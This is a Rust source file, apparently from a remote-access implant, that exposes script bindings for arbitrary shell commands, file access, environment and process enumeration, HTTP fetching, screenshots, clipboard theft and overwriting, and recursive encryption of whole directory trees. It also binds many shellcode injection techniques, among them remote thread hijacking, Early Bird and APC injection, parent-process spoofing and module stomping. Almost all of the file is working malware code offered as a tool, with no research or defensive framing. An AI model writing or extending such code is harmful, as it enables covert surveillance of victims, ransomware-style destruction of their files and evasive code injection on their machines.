// ./src/agent/scripting.rs
use rhai::{Engine, Scope, Dynamic};
use std::fs;
use walkdir::WalkDir;
use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce
};
use rand::RngCore;
use crate::utils; 
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

// [NEW] Media Imports
use screenshots::Screen;
use std::io::Cursor;
use image::ImageOutputFormat;
use arboard::Clipboard;

// --- SHARED HELPER FOR FILE BROWSING ---
// Returns a JSON string of the directory contents
pub fn get_directory_json(path: &str) -> String {
    let mut entries = Vec::new();
    
    // Handle root listing or standard path
    let search_path = if path.is_empty() { "." } else { path };

    if let Ok(read_dir) = fs::read_dir(search_path) {
        for entry_result in read_dir {
            if let Ok(entry) = entry_result {
                let metadata = entry.metadata().ok();
                let is_dir = metadata.as_ref().map(|m| m.is_dir()).unwrap_or(false);
                let size = metadata.as_ref().map(|m| m.len()).unwrap_or(0);
                let name = entry.file_name().to_string_lossy().to_string();
                
                // Unix permissions or Windows attributes simplified
                let permissions = if let Some(m) = &metadata {
                    if m.permissions().readonly() { "r" } else { "rw" }
                } else { "?" };

                let modified = metadata.as_ref()
                    .and_then(|m| m.modified().ok())
                    .map(|t| t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_secs())
                    .unwrap_or(0);

                entries.push(serde_json::json!({
                    "name": name,
                    "is_dir": is_dir,
                    "size": size,
                    "perms": permissions,
                    "mod_time": modified
                }));
            }
        }
    } else {
        return serde_json::json!({"error": format!("Failed to read path: {}", path)}).to_string();
    }

    // Sort: Directories first, then files
    entries.sort_by(|a, b| {
        let a_dir = a["is_dir"].as_bool().unwrap_or(false);
        let b_dir = b["is_dir"].as_bool().unwrap_or(false);
        if a_dir == b_dir {
            a["name"].as_str().unwrap_or("").cmp(b["name"].as_str().unwrap_or(""))
        } else {
            b_dir.cmp(&a_dir)
        }
    });

    serde_json::to_string(&entries).unwrap_or("[]".into())
}

// --- CRYPTO HELPERS ---

fn do_encrypt(cipher: &Aes256Gcm, plaintext: &[u8]) -> Result<Vec<u8>, String> {
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    match cipher.encrypt(nonce, plaintext) {
        Ok(ct) => {
            let mut final_payload = nonce_bytes.to_vec();
            final_payload.extend_from_slice(&ct);
            Ok(final_payload)
        },
        Err(e) => Err(format!("AES Error: {}", e)),
    }
}

fn do_decrypt(cipher: &Aes256Gcm, encrypted_data: &[u8]) -> Result<Vec<u8>, String> {
    if encrypted_data.len() < 12 { return Err("Data too short".to_string()); }
    let (nonce_bytes, ciphertext) = encrypted_data.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);
    match cipher.decrypt(nonce, ciphertext) {
        Ok(pt) => Ok(pt),
        Err(e) => Err(format!("AES Error: {}", e)),
    }
}

// --- EXTENSION MANAGER ---

pub struct ExtensionManager {
    engine: Engine,
    scope: Scope<'static>,
}

impl ExtensionManager {
    pub fn new() -> Self {
        let mut engine = Engine::new();

        // 1. File System Ops
        engine.register_fn("internal_read", |path: &str| -> String {
            match fs::read_to_string(path) { Ok(c) => c, Err(e) => format!("Error: {}", e) }
        });

        engine.register_fn("internal_write", |path: &str, data: &str| -> String {
            match fs::write(path, data) { Ok(_) => "Success".to_string(), Err(e) => format!("Error: {}", e) }
        });

        // [UPDATED] internal_ls now returns JSON for the UI, or can be parsed by scripts
        engine.register_fn("internal_ls", |path: &str| -> String {
            get_directory_json(path)
        });

        // 2. System Ops
        engine.register_fn("internal_env", |var: &str| -> String {
            std::env::var(var).unwrap_or_else(|_| "Not Found".to_string())
        });

        engine.register_fn("internal_sysinfo", || -> String {
            let hostname = sys_info::hostname().unwrap_or_default();
            let os = sys_info::os_release().unwrap_or_default();
            format!("Host: {}\nOS: {}", hostname, os)
        });

        engine.register_fn("exec_os", |cmd: &str| -> String {
             let (out, err, _) = utils::execute_shell_command(cmd);
             if !out.is_empty() { out } else { err }
        });

        engine.register_fn("internal_procs", || -> String {
            utils::get_process_list()
        });

        // 3. Network Ops
        engine.register_fn("internal_http_get", |url: &str| -> String {
            match reqwest::blocking::get(url) {
                Ok(resp) => resp.text().unwrap_or_else(|e| format!("Text Error: {}", e)),
                Err(e) => format!("Request Error: {}", e),
            }
        });

        // 4. Crypto Ops
        engine.register_fn("internal_keygen", || -> String {
            let mut key = [0u8; 32];
            OsRng.fill_bytes(&mut key);
            hex::encode(key)
        });

        engine.register_fn("internal_encrypt_file", |path: &str, key_hex: &str| -> String {
            let key_bytes = match hex::decode(key_hex) { Ok(k) => k, Err(_) => return "Invalid Key".into() };
            if key_bytes.len() != 32 { return "Key must be 32 bytes".into(); }
            let plaintext = match fs::read(path) { Ok(d) => d, Err(e) => return format!("Read Error: {}", e) };
            let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_bytes);
            let cipher = Aes256Gcm::new(key);
            match do_encrypt(&cipher, &plaintext) {
                Ok(data) => match fs::write(path, data) { Ok(_) => "Success".into(), Err(e) => format!("Write Error: {}", e) },
                Err(e) => e,
            }
        });

        engine.register_fn("internal_decrypt_file", |path: &str, key_hex: &str| -> String {
            let key_bytes = match hex::decode(key_hex) { Ok(k) => k, Err(_) => return "Invalid Key".into() };
            if key_bytes.len() != 32 { return "Key must be 32 bytes".into(); }
            let encrypted = match fs::read(path) { Ok(d) => d, Err(e) => return format!("Read Error: {}", e) };
            let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_bytes);
            let cipher = Aes256Gcm::new(key);
            match do_decrypt(&cipher, &encrypted) {
                Ok(data) => match fs::write(path, data) { Ok(_) => "Success".into(), Err(e) => format!("Write Error: {}", e) },
                Err(e) => e,
            }
        });

        engine.register_fn("internal_encrypt_recursive", |root_path: &str, key_hex: &str| -> String {
            let key_bytes = match hex::decode(key_hex) { Ok(k) => k, Err(_) => return "Invalid Key".into() };
            if key_bytes.len() != 32 { return "Key must be 32 bytes".into(); }
            let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_bytes);
            let cipher = Aes256Gcm::new(key);
            let mut success = 0; let mut fail = 0;
            for entry in WalkDir::new(root_path).into_iter().filter_map(|e| e.ok()) {
                if entry.file_type().is_file() {
                    let path = entry.path();
                    if let Ok(pt) = fs::read(path) {
                        if let Ok(ct) = do_encrypt(&cipher, &pt) {
                            if fs::write(path, ct).is_ok() { success += 1; } else { fail += 1; }
                        } else { fail += 1; }
                    } else { fail += 1; }
                }
            }
            format!("Encrypted: {}, Failed: {}", success, fail)
        });

        engine.register_fn("internal_decrypt_recursive", |root_path: &str, key_hex: &str| -> String {
            let key_bytes = match hex::decode(key_hex) { Ok(k) => k, Err(_) => return "Invalid Key".into() };
            if key_bytes.len() != 32 { return "Key must be 32 bytes".into(); }
            let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_bytes);
            let cipher = Aes256Gcm::new(key);
            let mut success = 0; let mut fail = 0;
            for entry in WalkDir::new(root_path).into_iter().filter_map(|e| e.ok()) {
                if entry.file_type().is_file() {
                    let path = entry.path();
                    if let Ok(ct) = fs::read(path) {
                        if let Ok(pt) = do_decrypt(&cipher, &ct) {
                            if fs::write(path, pt).is_ok() { success += 1; } else { fail += 1; }
                        } else { fail += 1; }
                    } else { fail += 1; }
                }
            }
            format!("Decrypted: {}, Failed: {}", success, fail)
        });

        // --- [NEW] CLIPBOARD & SCREENSHOTS ---

        // 1. Screenshot (Returns JSON Array of Base64 Strings)
        engine.register_fn("internal_screenshot", || -> String {
            let screens = Screen::all().unwrap_or_default();
            let mut results = Vec::new();
            
            for (i, screen) in screens.iter().enumerate() {
                if let Ok(image) = screen.capture() {
                     let mut cursor = Cursor::new(Vec::new());
                     // Compress to PNG for smaller size
                     if image.write_to(&mut cursor, ImageOutputFormat::Png).is_ok() {
                         let b64 = BASE64.encode(cursor.get_ref());
                         results.push(serde_json::json!({
                             "monitor_index": i,
                             "width": screen.display_info.width,
                             "height": screen.display_info.height,
                             "b64": b64
                         }));
                     }
                }
            }
            serde_json::to_string(&results).unwrap_or("[]".into())
        });

        // 2. Clipboard GET
        engine.register_fn("internal_clipboard_get", || -> String {
            match Clipboard::new() {
                Ok(mut cb) => cb.get_text().unwrap_or_else(|e| format!("[Empty/Image] {}", e)),
                Err(e) => format!("Clipboard Init Error: {}", e),
            }
        });

        // 3. Clipboard SET
        engine.register_fn("internal_clipboard_set", |text: &str| -> String {
            match Clipboard::new() {
                Ok(mut cb) => match cb.set_text(text) {
                    Ok(_) => "Success".into(),
                    Err(e) => format!("Set Error: {}", e),
                },
                Err(e) => format!("Clipboard Init Error: {}", e),
            }
        });

        // 4. Clipboard CLEAR
        engine.register_fn("internal_clipboard_clear", || -> String {
            match Clipboard::new() {
                Ok(mut cb) => match cb.clear() {
                    Ok(_) => "Clipboard Cleared".into(),
                    Err(e) => format!("Clear Error: {}", e),
                },
                Err(e) => format!("Clipboard Init Error: {}", e),
            }
        });

        // --- INJECTION BINDINGS (Native) ---

        // 1. Remote Hijack
        engine.register_fn("native_inject_remote_hijack", |pid_str: &str, b64_code: &str| -> String {
            let pid = pid_str.parse::<u32>().unwrap_or(0);
            let shellcode = BASE64.decode(b64_code).unwrap_or_default();
            match crate::agent::injection::inject_remote_hijack(pid, &shellcode) {
                Ok(msg) => msg, Err(e) => format!("Hijack Error: {}", e),
            }
        });

        // 2. Early Bird (Spawn)
        engine.register_fn("native_inject_spawn_early_bird", |binary: &str, b64_code: &str| -> String {
            let shellcode = BASE64.decode(b64_code).unwrap_or_default();
            match crate::agent::injection::inject_spawn_early_bird(binary, &shellcode) {
                Ok(msg) => msg, Err(e) => format!("Spawn Error: {}", e),
            }
        });

        // 3. Remote APC
        engine.register_fn("native_inject_remote_apc", |pid_str: &str, b64_code: &str| -> String {
            let pid = pid_str.parse::<u32>().unwrap_or(0);
            let shellcode = BASE64.decode(b64_code).unwrap_or_default();
            match crate::agent::injection::inject_remote_apc(pid, &shellcode) {
                Ok(msg) => msg, Err(e) => format!("APC Error: {}", e),
            }
        });

        // 4. Classic Remote Thread
        engine.register_fn("native_inject_remote_create_thread", |pid_str: &str, b64_code: &str| -> String {
            let pid = pid_str.parse::<u32>().unwrap_or(0);
            let shellcode = BASE64.decode(b64_code).unwrap_or_default();
            match crate::agent::injection::inject_remote_create_thread(pid, &shellcode) {
                Ok(msg) => msg, Err(e) => format!("Classic Error: {}", e),
            }
        });

        // 5. Self Injection
        engine.register_fn("native_inject_self", |b64_code: &str| -> String {
            let shellcode = BASE64.decode(b64_code).unwrap_or_default();
            match crate::agent::injection::inject_self(&shellcode) {
                Ok(msg) => msg, Err(e) => format!("Self Error: {}", e),
            }
        });

        // 6. Advanced Spawn (PPID + BlockDLLs)
        engine.register_fn("native_inject_spawn_advanced", |binary: &str, ppid_str: &str, b64_code: &str| -> String {
            let ppid = ppid_str.parse::<u32>().unwrap_or(0);
            let shellcode = BASE64.decode(b64_code).unwrap_or_default();
            match crate::agent::injection::inject_spawn_advanced(binary, ppid, &shellcode) {
                Ok(msg) => msg, Err(e) => format!("Adv Spawn Error: {}", e),
            }
        });

        // 7. Module Stomping (Manual)
        engine.register_fn("native_inject_module_stomping", |pid_str: &str, dll_name: &str, b64_code: &str| -> String {
            let pid = pid_str.parse::<u32>().unwrap_or(0);
            let shellcode = BASE64.decode(b64_code).unwrap_or_default();
            match crate::agent::injection::inject_module_stomping(pid, dll_name, &shellcode) {
                Ok(msg) => msg, Err(e) => format!("Stomp Error: {}", e),
            }
        });

        // 8. Module Stomping (Auto-Discovery)
        engine.register_fn("native_inject_module_stomping_auto", |pid_str: &str, b64_code: &str| -> String {
            let pid = pid_str.parse::<u32>().unwrap_or(0);
            let shellcode = BASE64.decode(b64_code).unwrap_or_default();
            match crate::agent::injection::inject_module_stomping_auto(pid, &shellcode) {
                Ok(msg) => msg, Err(e) => format!("Auto Stomp Error: {}", e),
            }
        });

        engine.register_fn("print_log", |msg: &str| {
            eprintln!("[Ext Log] {}", msg);
        });

        Self {
            engine,
            scope: Scope::new(),
        }
    }

    pub fn run_script(&mut self, script_content: &str, args: Vec<String>) -> String {
        let rhai_args: Vec<Dynamic> = args.into_iter().map(|s| s.into()).collect();
        self.scope.set_or_push("args", rhai_args);
        match self.engine.eval_with_scope::<String>(&mut self.scope, script_content) {
            Ok(result) => result,
            Err(e) => format!("[Script Exception]: {}", e),
        }
    }
}
